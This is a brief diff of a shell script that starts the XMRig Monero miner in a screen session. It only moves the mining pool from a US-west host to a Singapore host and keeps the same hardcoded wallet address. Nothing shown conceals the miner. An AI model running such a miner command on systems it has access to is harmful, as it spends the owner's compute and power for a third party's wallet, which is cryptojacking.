@@ -25,6 +25,6 @@ clear
 
 
 screen -R xmr
-./xmrig -o us-west.minexmr.com:443 -u 43jM8LgyPh6esCinkUjvrkPdwyKVbm3R6jdvWncaE4vBZZd4d9Udzyx8xHMmfodP1gF9ymGhg8RTe52jYLKMPe7FBf16gwk -k --tls --rig-id Ne2
+./xmrig -o sg.minexmr.com:443 -u 43jM8LgyPh6esCinkUjvrkPdwyKVbm3R6jdvWncaE4vBZZd4d9Udzyx8xHMmfodP1gF9ymGhg8RTe52jYLKMPe7FBf16gwk -k --tls --rig-id Ne2
 
 #./xmrig
